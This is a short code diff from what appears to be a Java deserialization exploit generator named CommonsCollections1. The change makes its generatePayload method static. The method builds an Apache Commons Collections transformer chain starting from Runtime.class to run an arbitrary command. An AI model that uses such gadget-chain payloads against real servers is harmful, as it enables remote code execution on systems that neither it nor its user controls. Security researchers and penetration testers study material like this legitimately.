@@ -18,7 +18,7 @@ import org.apache.commons.collections.map.TransformedMap;
 
 public class CommonsCollections1  {
 
-    public String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException {
+    public static String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException {
         final String[] execArgs = new String[]{cmd};
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
